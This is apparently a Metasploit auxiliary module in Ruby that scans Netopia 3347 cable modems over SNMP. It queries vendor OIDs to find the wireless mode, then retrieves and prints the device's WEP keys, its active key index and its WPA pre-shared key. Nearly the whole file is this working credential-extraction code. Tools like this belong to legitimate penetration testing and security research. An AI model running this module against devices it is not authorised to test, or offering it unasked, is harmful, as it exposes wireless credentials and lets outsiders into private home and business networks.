#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Netopia 3347 Cable Modem Wifi Enumeration',
      'Description' => "This module will extract wep keys and WPA preshared keys",
      'Author'      => ['PercentX deral_heiland[at]rapid7.com'],
      'License'     => MSF_LICENSE
    )

  end

  def run_host(ip)
      output_data = {}
    begin
      snmp = connect_snmp

      if snmp.get_value('sysDescr.0') =~ /Netopia 3347/

      wifistatus = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.1.0')
        if wifistatus == "1"

          wifiversion = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.9.1.4.1')
            if wifiversion == "1"
            print_line("Open Access Wifi is Enabled")

            #Wep enabled
            elsif wifiversion == "2"
              print_line("Device is configured for WEP Manual")
              print_good("#{ip}")
              wepkey1 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.1')
              print_good("WEP KEY1: #{wepkey1}")
              wepkey2 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.2')
              print_good("WEP KEY2: #{wepkey2}")
              wepkey3 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.3')
              print_good("WEP KEY3: #{wepkey3}")
              wepkey4 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.4')
              print_good("WEP KEY4: #{wepkey4}")
              actkey = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.13.0')
              print_good("Active Wep key is Key#{actkey}")

            #wep auto enabled
            elsif wifiversion == "3"
              print_line("Device is configured for WEP Automatic")
              wepkey1 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.1')
              print_good("#{ip}")
              print_good("WEP KEY1: #{wepkey1}")

            #WPA enabled
            elsif wifiversion == "4"
              print_line("Device is configured for WPA ")
              print_good("#{ip}")
              wpapsk = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.9.1.5.1')
              print_good("WPA PSK: #{wpapsk}")

            #WPA Enterprise enabled
            elsif wifiversion == "5"
              print_line("Device is configured for WPA enterprise")
              print_good("#{ip}")
              else
              print_line("FAILED")
            end

      else
         print_line("WIFI is not enabled")
      end
    end


     rescue ::SNMP::UnsupportedVersion
     rescue ::SNMP::RequestTimeout
     rescue ::Interrupt
       raise $!
     rescue ::Exception => e
       print_error("#{ip} error: #{e.class} #{e}")
     disconnect_snmp
     end
  end
end
